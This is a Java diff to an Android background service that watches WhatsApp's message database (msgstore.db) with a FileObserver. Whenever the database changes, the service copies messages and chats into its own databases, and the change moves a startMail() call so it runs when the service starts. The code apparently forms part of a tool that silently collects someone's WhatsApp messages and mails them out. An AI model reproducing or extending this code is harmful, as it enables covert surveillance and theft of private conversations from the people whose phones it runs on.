@@ -124,57 +124,57 @@ public class MainService extends Service {
 			e.printStackTrace();
 		}
 
-		startMail();
+
 	}
 
 	@Override
-	public void onStart(Intent intent, int startId) {
-
+	public int onStartCommand(Intent intent, int flags, int startId) {
 		// final String pathToWatch =
-		// android.os.Environment.getDataDirectory().toString()+"/data/com.whatsapp/databases/msgstore.db";
+				// android.os.Environment.getDataDirectory().toString()+"/data/com.whatsapp/databases/msgstore.db";
 
-		internal = new DatabaseHelperInternal(getApplicationContext());
-		external = new DatabaseHelperExternal(getApplicationContext());
+				internal = new DatabaseHelperInternal(getApplicationContext());
+				external = new DatabaseHelperExternal(getApplicationContext());
 
-		try {
-			daoMsgInternal = internal.getMessagesDao();
-			daoMsgExternal = external.getMessagesDao();
-			daoChatInternal = internal.getChatDao();
-			daoChatExternal = external.getChatDao();
+				try {
+					daoMsgInternal = internal.getMessagesDao();
+					daoMsgExternal = external.getMessagesDao();
+					daoChatInternal = internal.getChatDao();
+					daoChatExternal = external.getChatDao();
 
-		} catch (Exception e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
-		}
-
-		observer = new FileObserver(pathToWatch) { // set up a file observer to
-													// watch this directory on
-													// sd card
-
-			@Override
-			public void onEvent(int event, String file) {
-
-				switch (event) {
-				case FileObserver.MODIFY:
-					Log.d("DEBUG", "MODIFY:" + pathToWatch + file);
-
-					updateMsg();
-					updateChat();
-					break;
-				default:
-					// just ignore
-					break;
+				} catch (Exception e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
 				}
 
-				// Toast.makeText(getBaseContext(), file + " was saved!",
-				// Toast.LENGTH_LONG);
-				// }
-			}
-		};
-		observer.startWatching(); // START OBSERVING
+				observer = new FileObserver(pathToWatch) { // set up a file observer to
+															// watch this directory on
+															// sd card
 
-		// For time consuming an long tasks you can launch a new thread here...
-		Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
+					@Override
+					public void onEvent(int event, String file) {
+
+						switch (event) {
+						case FileObserver.MODIFY:
+							Log.d("DEBUG", "MODIFY:" + pathToWatch + file);
+
+							updateMsg();
+							updateChat();
+							break;
+						default:
+							// just ignore
+							break;
+						}
+
+						// Toast.makeText(getBaseContext(), file + " was saved!",
+						// Toast.LENGTH_LONG);
+						// }
+					}
+				};
+				observer.startWatching(); // START OBSERVING
+				startMail();
+				// For time consuming an long tasks you can launch a new thread here...
+				Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();
+				return startId;
 	}
 
 	private void startMail(){
